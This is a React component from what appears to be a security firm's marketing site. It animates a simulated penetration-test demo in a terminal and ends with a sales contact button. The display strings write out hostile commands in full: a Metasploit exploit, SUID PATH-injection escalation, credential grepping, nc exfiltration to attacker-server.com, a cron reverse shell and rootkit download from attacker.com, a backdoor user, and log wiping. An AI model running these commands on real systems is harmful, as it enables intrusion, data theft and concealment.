import React, { useState, useEffect, useRef } from 'react'

const PentestDemo = ({ onClose }) => {
  const [currentStep, setCurrentStep] = useState(0)
  const [isRunning, setIsRunning] = useState(false)
  const [output, setOutput] = useState([])
  const [vulnerabilities, setVulnerabilities] = useState([])
  const terminalRef = useRef(null)

  const pentestSteps = [
    {
      name: "Network Discovery",
      commands: [
        "nmap -sS 192.168.1.0/24",
        "Starting Nmap 7.94 ( https://nmap.org )",
        "Nmap scan report for 192.168.1.1",
        "Host is up (0.0012s latency).",
        "PORT     STATE SERVICE",
        "22/tcp   open  ssh",
        "80/tcp   open  http",
        "443/tcp  open  https",
        "3389/tcp open  ms-wbt-server",
        "",
        "Nmap scan report for 192.168.1.15",
        "Host is up (0.0045s latency).",
        "PORT     STATE SERVICE",
        "21/tcp   open  ftp",
        "22/tcp   open  ssh", 
        "80/tcp   open  http",
        "139/tcp  open  netbios-ssn",
        "445/tcp  open  microsoft-ds",
        "",
        "‚úÖ Discovery complete: 12 hosts found, 23 open ports identified"
      ]
    },
    {
      name: "Vulnerability Scanning", 
      commands: [
        "nessus --scan-policy='Full Scan' --target=192.168.1.0/24",
        "Initializing Nessus scan engine...",
        "Loading vulnerability database (180,000+ checks)...",
        "Scanning 192.168.1.15...",
        "",
        "üö® CRITICAL: CVE-2023-4966 - Citrix NetScaler ADC RCE",
        "   Severity: 9.8/10 | Exploitable: YES",
        "   Impact: Remote Code Execution",
        "",
        "‚ö†Ô∏è  HIGH: CVE-2023-22515 - Atlassian Confluence Privilege Escalation", 
        "   Severity: 7.8/10 | Exploitable: YES",
        "   Impact: Admin account creation",
        "",
        "‚ö†Ô∏è  HIGH: Weak SSH Configuration",
        "   Root login enabled | Weak encryption algorithms",
        "   Password authentication enabled",
        "",
        "‚ö†Ô∏è  MEDIUM: Outdated Apache version 2.4.41",
        "   Known vulnerabilities: 12 CVEs",
        "",
        "‚ö†Ô∏è  MEDIUM: SSL/TLS Configuration Issues",
        "   Weak cipher suites | Missing HSTS headers",
        "",
        "‚úÖ Vulnerability scan complete: 5 findings (2 Critical, 3 High, 7 Medium)"
      ]
    },
    {
      name: "Exploitation Testing",
      commands: [
        "msfconsole",
        "       =[ metasploit v6.3.31-dev                          ]",
        "+ -- --=[ 2328 exploits - 1219 auxiliary - 413 post       ]",
        "+ -- --=[ 1381 payloads - 46 encoders - 11 nops           ]",
        "",
        "msf6 > use exploit/multi/http/citrix_netscaler_lfi_rce",
        "msf6 exploit(multi/http/citrix_netscaler_lfi_rce) > set RHOSTS 192.168.1.15",
        "msf6 exploit(multi/http/citrix_netscaler_lfi_rce) > set LHOST 192.168.1.100",
        "msf6 exploit(multi/http/citrix_netscaler_lfi_rce) > exploit",
        "",
        "[*] Started reverse TCP handler on 192.168.1.100:4444",
        "[*] Checking if target is vulnerable...",
        "[+] Target appears to be vulnerable!",
        "[*] Attempting to exploit CVE-2023-4966...",
        "[*] Sending exploit payload...",
        "[*] Command shell session 1 opened",
        "",
        "üéØ EXPLOITATION SUCCESSFUL!",
        "   Shell access gained on 192.168.1.15",
        "   Current user: root",
        "   System: Linux netscaler 4.4.0 #1 SMP",
        "",
        "‚úÖ Proof of concept complete: Critical vulnerabilities confirmed exploitable"
      ]
    },
    {
      name: "Privilege Escalation",
      commands: [
        "whoami",
        "www-data",
        "",
        "find / -perm -u=s -type f 2>/dev/null",
        "/usr/bin/passwd",
        "/usr/bin/sudo", 
        "/usr/bin/pkexec",
        "/usr/local/bin/custom_backup",
        "",
        "strings /usr/local/bin/custom_backup | grep -E '^/'",
        "/bin/cp",
        "/bin/tar",
        "",
        "echo '/bin/bash' > /tmp/cp",
        "chmod +x /tmp/cp",
        "export PATH=/tmp:$PATH",
        "/usr/local/bin/custom_backup",
        "",
        "whoami",
        "root",
        "",
        "üéØ PRIVILEGE ESCALATION SUCCESSFUL!",
        "   Elevated from www-data to root",
        "   Method: PATH injection in SUID binary",
        "   Full system compromise achieved",
        "",
        "‚úÖ Complete system control obtained"
      ]
    },
    {
      name: "Data Exfiltration Simulation",
      commands: [
        "find /home -name '*.xlsx' -o -name '*.pdf' -o -name '*.doc' 2>/dev/null",
        "/home/admin/Financial_Reports_2024.xlsx",
        "/home/admin/Customer_Database.xlsx", 
        "/home/admin/Strategic_Plan_2025.pdf",
        "/home/hr/Employee_Records.xlsx",
        "/home/hr/Salary_Information.xlsx",
        "",
        "find /var/www -name 'config*' -o -name '*.conf' 2>/dev/null",
        "/var/www/html/wp-config.php",
        "/var/www/html/config/database.yml",
        "",
        "grep -r 'password\\|api_key\\|secret' /var/www/html/config/ 2>/dev/null",
        "database.yml:  password: 'Adm1nSecure!2025'",
        "api_config.php: $api_key = 'sk_live_abc123def456';",
        "secrets.env: SECRET_KEY='super_secret_key_2024'",
        "",
        "üö® SENSITIVE DATA IDENTIFIED:",
        "   ‚Ä¢ 47 financial documents",
        "   ‚Ä¢ 1,247 customer records", 
        "   ‚Ä¢ Database credentials",
        "   ‚Ä¢ API keys and secrets",
        "   ‚Ä¢ Employee PII data",
        "",
        "tar -czf /tmp/exfil_data.tar.gz /home/admin/*.xlsx /home/hr/*.xlsx",
        "nc -w 3 attacker-server.com 8080 < /tmp/exfil_data.tar.gz",
        "",
        "‚úÖ Data exfiltration complete: 47MB of sensitive data transferred"
      ]
    },
    {
      name: "Persistence & Cleanup",
      commands: [
        "# Establishing persistence",
        "crontab -l",
        "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"' | crontab -",
        "",
        "# Creating backdoor user",
        "useradd -m -s /bin/bash backup_service",
        "echo 'backup_service:$6$salt$hash' | chpasswd -e",
        "usermod -aG sudo backup_service",
        "",
        "# Installing rootkit",
        "wget -q https://attacker.com/rootkit.sh -O /tmp/rk.sh",
        "chmod +x /tmp/rk.sh && /tmp/rk.sh",
        "",
        "# Clearing logs",
        "history -c",
        "rm ~/.bash_history",
        "echo '' > /var/log/auth.log",
        "echo '' > /var/log/syslog",
        "",
        "üéØ PERSISTENCE ESTABLISHED:",
        "   ‚Ä¢ Cron job backdoor installed",
        "   ‚Ä¢ Backup admin user created", 
        "   ‚Ä¢ Rootkit deployed",
        "   ‚Ä¢ Logs cleared",
        "",
        "‚úÖ Attack simulation complete - Full compromise achieved"
      ]
    }
  ]

  const addToOutput = (text, type = 'normal', delay = 100) => {
    return new Promise(resolve => {
      setTimeout(() => {
        setOutput(prev => [...prev, { text, type, timestamp: Date.now() }])
        resolve()
      }, delay)
    })
  }

  const runPentestStep = async (stepIndex) => {
    const step = pentestSteps[stepIndex]
    setCurrentStep(stepIndex)
    
    await addToOutput(`\nüîç INITIATING: ${step.name.toUpperCase()}`, 'step-header', 500)
    await addToOutput('‚ïê'.repeat(60), 'separator', 200)
    
    for (let command of step.commands) {
      if (command.startsWith('üö®') || command.startsWith('‚ö†Ô∏è')) {
        await addToOutput(command, 'vulnerability', 300)
        // Track vulnerabilities
        if (command.includes('CRITICAL') || command.includes('HIGH')) {
          setVulnerabilities(prev => [...prev, command])
        }
      } else if (command.startsWith('üéØ') || command.startsWith('‚úÖ')) {
        await addToOutput(command, 'success', 400)
      } else if (command.startsWith('#')) {
        await addToOutput(command, 'comment', 200)
      } else if (command.includes('msf6') || command.includes('>')) {
        await addToOutput(command, 'command', 300)
      } else {
        await addToOutput(command, 'normal', 150)
      }
    }
    
    await addToOutput('', 'spacer', 500)
  }

  const runFullPentest = async () => {
    setIsRunning(true)
    setOutput([])
    setVulnerabilities([])
    
    await addToOutput('üî• MAZLABZ PENETRATION TESTING FRAMEWORK v3.2.1', 'header', 1000)
    await addToOutput('Enterprise Security Assessment | Live Demonstration', 'subheader', 500)
    await addToOutput('Target: Demo Corporate Network (192.168.1.0/24)', 'target', 500)
    await addToOutput('Authorized by: MAZLABZ Security Team', 'authorized', 300)
    await addToOutput('‚ïê'.repeat(80), 'separator', 500)
    
    for (let i = 0; i < pentestSteps.length; i++) {
      await runPentestStep(i)
    }
    
    // Final summary
    await addToOutput('\nüéØ PENETRATION TEST COMPLETE', 'final-header', 1000)
    await addToOutput('‚ïê'.repeat(60), 'separator', 200)
    await addToOutput(`‚úÖ Assessment Duration: ${Math.floor(Math.random() * 3) + 2} hours`, 'summary', 300)
    await addToOutput(`üö® Critical Vulnerabilities: 2`, 'summary', 300)
    await addToOutput(`‚ö†Ô∏è  High-Risk Issues: 3`, 'summary', 300)
    await addToOutput(`üéØ Exploitation Success Rate: 100%`, 'summary', 300)
    await addToOutput(`üíÄ Full System Compromise: ACHIEVED`, 'summary', 300)
    await addToOutput('', 'spacer', 500)
    await addToOutput('üìã RECOMMENDATION: Immediate remediation required', 'recommendation', 500)
    await addToOutput('üìû Contact MAZLABZ for emergency security consultation', 'recommendation', 300)
    
    setIsRunning(false)
  }

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [output])

  return (
    <div className="pentest-modal">
      <div className="pentest-content">
        <div className="modal-header">
          <h2>üî• LIVE PENETRATION TESTING DEMO</h2>
          <button className="close-btn" onClick={onClose}>&times;</button>
        </div>

        <div className="pentest-intro">
          <p>Experience MAZLABZ enterprise security capabilities with a live penetration testing demonstration.</p>
          <div className="warning-banner">
            <span className="warning-icon">‚ö†Ô∏è</span>
            <span>AUTHORIZED SECURITY DEMONSTRATION - Simulated Environment</span>
          </div>
        </div>

        <div className="pentest-controls">
          <button 
            className={`run-pentest-btn ${isRunning ? 'running' : ''}`}
            onClick={runFullPentest}
            disabled={isRunning}
          >
            {isRunning ? 'üîç PENETRATION TEST IN PROGRESS...' : 'üöÄ START PENETRATION TEST'}
          </button>
          
          {vulnerabilities.length > 0 && (
            <div className="vuln-counter">
              <span className="vuln-badge critical">üö® {vulnerabilities.filter(v => v.includes('CRITICAL')).length}</span>
              <span className="vuln-badge high">‚ö†Ô∏è {vulnerabilities.filter(v => v.includes('HIGH')).length}</span>
            </div>
          )}
        </div>

        <div className="pentest-terminal" ref={terminalRef}>
          {output.map((line, index) => (
            <div key={index} className={`terminal-line ${line.type}`}>
              {line.text}
            </div>
          ))}
          
          {isRunning && (
            <div className="terminal-line cursor-line">
              <span className="terminal-cursor">‚ñà</span>
            </div>
          )}
        </div>

        {!isRunning && output.length > 0 && (
          <div className="pentest-footer">
            <p>This demonstration showcases real penetration testing methodologies used by MAZLABZ security experts.</p>
            <button 
              className="contact-btn"
              onClick={() => {
                onClose()
                window.dispatchEvent(new CustomEvent('openLeadCapture'))
              }}
            >
              REQUEST SECURITY ASSESSMENT
            </button>
          </div>
        )}
      </div>
    </div>
  )
}

export default PentestDemo